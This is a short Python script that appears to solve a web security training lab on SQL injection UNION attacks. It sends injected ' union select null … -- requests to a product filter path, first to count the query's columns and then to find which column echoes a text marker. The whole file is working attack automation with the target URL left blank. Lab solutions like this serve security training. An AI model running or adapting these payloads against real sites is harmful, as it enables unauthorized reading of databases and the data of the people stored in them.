import requests as r
from time import sleep

# lab name: SQL injection UNION attack, finding a column containing text

link = "" # without the last backslash

vuln_path = "/filter?category=Pets"


def found_columns():

    col = 0
    response ="Error"
    payload="\' union select "
    while "Error" in  response : 
        if col == 0:
            payload += "null"
        else:
            payload+=",null"
        finalLink = link+vuln_path+payload + " --"
        col+=1
        my_req = r.get(finalLink)
        response = my_req.text
        print(finalLink)
        
        sleep(0.4)

    print("Found {} columns".format(col))
    return col




#number_col = found_columns() # return us 3 columns



# permutation 
def brute_force_col(string_to_found,nb_col):

    payload = ['null' for i in range(nb_col)]
    response=""
    for i in range(nb_col):
        payload[i] =  "\'"+ string_to_found + "\'"
        final_payload = ",".join(payload)

        to_send = link + vuln_path + "\' union select " + final_payload  + " --"
        myreq = r.get(to_send)
        response = myreq.text
      
        if len(response.split(string_to_found)) > 2 : 
            print("Found ", string_to_found , " at ", i+1) # the real position is  i+1 since we start at index 0
            return

        print(to_send)
        payload[i]='null'
        sleep(0.4)






brute_force_col('oSlw45', 3)
